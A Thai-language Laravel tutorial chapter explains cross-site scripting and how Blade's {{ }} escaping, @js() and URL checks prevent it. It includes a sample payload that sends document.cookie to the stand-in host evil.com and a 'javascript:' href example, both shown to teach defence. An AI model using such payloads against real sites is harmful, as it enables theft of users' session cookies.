# 10.2 XSS Prevention (การป้องกัน Cross-Site Scripting)

> **บทนี้คุณจะได้เรียนรู้**
> - XSS Attack คืออะไร
> - ประเภทของ XSS (Stored, Reflected, DOM-based)
> - การป้องกันด้วย Blade Escaping
> - เมื่อไหร่ควรใช้ {!! !!}

---

## วัตถุประสงค์การเรียนรู้

เมื่อจบบทเรียนนี้ ผู้เรียนจะสามารถ:
1. อธิบายการโจมตีแบบ XSS ได้
2. ใช้ `{{ }}` ป้องกัน XSS ใน Blade ได้
3. ระบุกรณีที่ต้องระวังเมื่อใช้ `{!! !!}` ได้

---

## เนื้อหา

### 1. XSS Attack คืออะไร?

**XSS (Cross-Site Scripting)** คือการโจมตีที่แทรกโค้ด JavaScript เข้าไปในหน้าเว็บ เพื่อขโมยข้อมูลหรือควบคุมเบราว์เซอร์ของผู้ใช้

#### ตัวอย่างการโจมตี

```php
// สมมติผู้โจมตีกรอกชื่อเป็น:
// <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

// ❌ ถ้าแสดงโดยไม่ Escape
{!! $user->name !!}
// จะรัน JavaScript ขโมย Cookie!

// ✅ Blade Escape อัตโนมัติ
{{ $user->name }}
// แสดงเป็นข้อความ: &lt;script&gt;...&lt;/script&gt;
```

### 2. การป้องกันใน Blade

| Syntax | ป้องกัน XSS | ใช้เมื่อ |
|--------|-----------|---------|
| `{{ $var }}` | ✅ ป้องกัน | ข้อมูลจากผู้ใช้ทุกกรณี |
| `{!! $var !!}` | ❌ ไม่ป้องกัน | HTML ที่เชื่อถือได้เท่านั้น |
| `@js($var)` | ✅ ป้องกัน | ส่งข้อมูลเข้า JavaScript |

```blade
{{-- ✅ ปลอดภัย - ใช้กับข้อมูลจากผู้ใช้ --}}
<p>ชื่อ: {{ $user->name }}</p>
<input value="{{ $user->email }}">

{{-- ⚠️ ระวัง - ใช้เฉพาะ HTML ที่ Admin สร้าง --}}
<div>{!! $page->content !!}</div>

{{-- ✅ ส่งข้อมูลเข้า JavaScript อย่างปลอดภัย --}}
<script>
    const user = @js($user);
</script>
```

### 3. กรณีที่ต้องระวัง

```blade
{{-- ❌ อันตราย - ใส่ข้อมูลผู้ใช้ใน attribute โดยไม่ Escape --}}
<a href="{{ $user->website }}">เว็บไซต์</a>
{{-- ถ้า website = "javascript:alert('XSS')" จะรัน JS! --}}

{{-- ✅ ปลอดภัย - ตรวจสอบ URL ก่อน --}}
@if(Str::startsWith($user->website, ['http://', 'https://']))
    <a href="{{ $user->website }}">เว็บไซต์</a>
@endif
```

---

## สรุป

| หัวข้อ | สิ่งที่ได้เรียนรู้ |
|--------|-------------------|
| XSS Attack | แทรก JavaScript เพื่อขโมยข้อมูล |
| `{{ }}` | Escape อัตโนมัติ ป้องกัน XSS |
| `{!! !!}` | ไม่ Escape ใช้เฉพาะ HTML ที่เชื่อถือได้ |
| `@js()` | ส่งข้อมูลเข้า JavaScript อย่างปลอดภัย |

---

**Navigation:**
[⬅️ ก่อนหน้า](01-csrf-protection.md) | [📚 สารบัญ](../../README.md) | [➡️ ถัดไป](03-auth-security.md)
